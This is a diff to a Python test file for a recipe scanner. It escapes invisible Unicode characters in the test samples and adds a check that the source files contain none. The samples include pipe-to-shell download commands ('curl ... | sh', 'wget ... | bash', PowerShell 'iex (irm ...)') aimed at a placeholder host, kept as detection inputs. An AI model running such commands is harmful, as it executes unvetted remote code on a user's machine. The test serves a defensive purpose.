@@ -184,8 +184,8 @@ class CheckRecipesTest(unittest.TestCase):
 
     def test_scan_flags_each_pattern(self):
         samples = [
-            "a​b",
-            "x‮y",
+            "a\u200bb",
+            "x\u202ey",
             "curl https://e.invalid/i.sh | sh",
             "wget -qO- https://e.invalid | bash",
             "iex (irm https://e.invalid)",
@@ -203,6 +203,17 @@ class CheckRecipesTest(unittest.TestCase):
 
     def test_scan_clean_text_has_no_warnings(self):
         self.assertEqual(cr.scan_suspicious("f.md", VALID_RECIPE), [])
+
+    def test_sources_have_no_raw_invisible_characters(self):
+        ranges = [(0x200B, 0x200F), (0x202A, 0x202E), (0x2060, 0x2064),
+                  (0x2066, 0x2069), (0xFEFF, 0xFEFF)]
+        root = Path(__file__).resolve().parent.parent
+        for rel in ("scripts/check_recipes.py", "tests/test_check_recipes.py"):
+            text = (root / rel).read_text(encoding="utf-8")
+            for ch in text:
+                for lo, hi in ranges:
+                    self.assertFalse(lo <= ord(ch) <= hi,
+                                     f"{rel} contains raw U+{ord(ch):04X}")
 
     def test_main_exit_codes(self):
         bad = self.tmp / "bad"
